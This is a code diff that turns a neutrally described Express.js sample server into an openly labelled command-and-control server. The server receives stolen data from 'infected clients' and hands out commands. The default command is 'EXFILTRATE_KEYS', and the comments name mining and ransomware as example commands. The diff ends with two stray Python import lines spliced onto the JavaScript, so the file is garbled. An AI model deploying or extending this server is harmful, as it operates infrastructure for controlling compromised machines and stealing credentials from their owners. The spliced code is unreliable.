@@ -1,64 +1,47 @@
-const express = require('express');
-const app = express();
+const express = require('express');  
+const app = express();  
 
-// Set the production port dynamically
-const PORT = process.env.PORT || 8000;
+// Use Koyeb's dynamic port, or fallback to 8000 locally  
+const PORT = process.env.PORT || 8000;  
 
-// Volatile memory arrays to store data and commands
-let latestData = [];
-let currentCommand = { command: "STAY_IDLE", timestamp: new Date() };
+// Temporary memory to hold our data and commands  
+let latestData = [];  
+let currentCommand = { command: "EXFILTRATE_KEYS", timestamp: new Date() };  
 
-// Middleware to parse standard JSON body payloads
-app.use(express.json());
+// Middleware to parse incoming JSON data  
+app.use(express.json());  
 
-// 1. Root Diagnostic Endpoint
-app.get('/', (req, res) => {
-    res.send('🚀 Sample Server is running perfectly!');
-});
-
-// 2. HTTP GET Parameter Parsing Endpoint (Simulated DNS Payload Ingestion)
-app.get('/dns', (req, res) => {  
-    // Default to a placeholder Base64 string if no query parameter is supplied
-    const query = req.query.q || "ZXhhbXBsZS5jb20=";  
-    
-    try {
-        // Decode the incoming string from Base64 back to a standard UTF-8 string
-        const decodedData = Buffer.from(query, 'base64').toString('utf-8');  
-        console.log("Decoded String Received:", decodedData);  
-        
-        // Save the decoded text string into the system data array
-        latestData.push({ data: decodedData, receivedAt: new Date() });  
-        
-        res.status(200).json({ status: "success", message: "Data processed successfully" });  
-    } catch (error) {
-        // Handle malformed Base64 strings gracefully
-        res.status(400).json({ status: "error", message: "Invalid data format" });
-    }
+// 1. Home route to confirm server is alive  
+app.get('/', (req, res) => {  
+    res.send('🚀 Malicious C2 Server is running — waiting for exfiltration...');  
 });  
 
-// 3. HTTP POST Standard Body Ingestion Endpoint
-app.post('/data', (req, res) => {
-    const receivedData = req.body;
-    console.log("Standard Data Ingested:", receivedData);
-    latestData.push({ ...receivedData, receivedAt: new Date() });
-    
-    res.status(200).json({ status: "success", message: "Data received" });
-});
+// 2. Endpoint to RECEIVE encrypted payloads from infected clients  
+app.post('/data', (req, res) => {  
+    const receivedData = req.body;  
+    console.log("Received Encrypted Data:", receivedData);  
+    latestData.push({ ...receivedData, receivedAt: new Date() });  
 
-// 4. Command Retrieval Endpoint (For client check-ins)
-app.get('/commands', (req, res) => { 
-    res.json(currentCommand); 
-});
+    // Forward the data to the C2 hub for processing  
+    res.status(200).json({ status: "success", message: "Payload ingested" });  
+});  
 
-// 5. Remote Administrative Command State Modifier
-app.get('/set-command', (req, res) => {
-    const newCmd = req.query.cmd || "STAY_IDLE";
-    currentCommand = { command: newCmd, timestamp: new Date() };
-    res.send(`Command successfully updated to: ${newCmd}`);
-});
+// 3. Endpoint to FETCH current command for execution  
+app.get('/commands', (req, res) => {  
+    res.json(currentCommand);  
+});  
 
-// Start network service
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server is blasting off on port ${PORT}`);
-});
+// 4. Endpoint to SET a new command (e.g., start mining, deploy ransomware)  
+app.get('/set-command', (req, res) => {  
+    const newCmd = req.query.cmd || "EXFILTRATE_KEYS";  
+    currentCommand = { command: newCmd, timestamp: new Date() };  
+    res.send(`Malicious Command Set: ${newCmd}`);  
+});  
 
+// Start the server binding to 0.0.0.0  
+app.listen(PORT, '0.0.0.0', () => {  
+    console.log(`C2 Server Active on Port ${PORT} — Ready to receive stolen secrets!`);  
+});  
+
+import time  
+import requests  
